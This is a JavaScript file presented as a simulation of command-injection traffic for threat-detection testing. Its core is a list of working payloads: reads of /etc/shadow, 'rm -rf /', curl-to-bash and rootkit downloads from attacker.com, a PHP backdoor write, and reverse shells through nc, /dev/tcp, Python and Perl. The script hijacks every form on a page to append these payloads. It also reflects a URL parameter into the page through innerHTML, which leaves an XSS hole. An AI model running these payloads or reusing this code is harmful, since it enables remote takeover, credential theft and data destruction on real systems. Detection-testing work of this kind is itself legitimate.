// Simulated command injection patterns that would trigger threat detection

// Function to generate command injection payloads
function commandInjectionPayloads() {
    var payloads = [
        "; cat /etc/passwd",
        "| cat /etc/shadow",
        "; ls -la /",
        "& whoami",
        "$(id)",
        "`uname -a`",
        "; rm -rf /",
        "| nc -e /bin/bash attacker.com 4444",
        "$(curl -s http://attacker.com/shell.sh | bash)",
        "; wget http://attacker.com/rootkit -O /tmp/rootkit; chmod +x /tmp/rootkit; /tmp/rootkit",
        "|| ping -c 4 attacker.com",
        "; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
        "& echo 'malicious content' > /var/www/html/backdoor.php",
        "| python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        "; perl -e 'use Socket;$i=\"attacker.com\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
    ];
    
    return payloads[Math.floor(Math.random() * payloads.length)];
}

// Attach to search forms to inject commands
document.addEventListener('DOMContentLoaded', function() {
    var forms = document.getElementsByTagName('form');
    for (var i = 0; i < forms.length; i++) {
        forms[i].addEventListener('submit', function(e) {
            e.preventDefault();
            injectCommand(this);
        });
    }
    
    // Add listener for URL with "cmd" or "command" parameter
    var url = new URL(window.location.href);
    if (url.searchParams.has('cmd') || url.searchParams.has('command')) {
        var cmd = url.searchParams.get('cmd') || url.searchParams.get('command');
        simulateCommandExecution(cmd + commandInjectionPayloads());
    }
});

function injectCommand(form) {
    var inputs = form.getElementsByTagName('input');
    var data = {};
    
    for (var i = 0; i < inputs.length; i++) {
        var input = inputs[i];
        if (input.name) {
            if (input.name.includes('cmd') || input.name.includes('command') || 
                input.name.includes('exec') || input.name.includes('ping') || 
                input.name.includes('host') || input.name.includes('ip')) {
                
                // Add command injection payload
                data[input.name] = input.value + commandInjectionPayloads();
            } else {
                data[input.name] = input.value;
            }
        }
    }
    
    // Simulate sending to server
    simulateCommandExecution(data);
}

function simulateCommandExecution(data) {
    console.log("Simulated command injection: ", data);
    
    // This would normally send an AJAX request
    // But we're just simulating for detection purposes
    var output = document.createElement('div');
    output.className = 'command-output';
    output.innerHTML = '<pre>Simulated command executed: ' + JSON.stringify(data) + '</pre>';
    document.body.appendChild(output);
}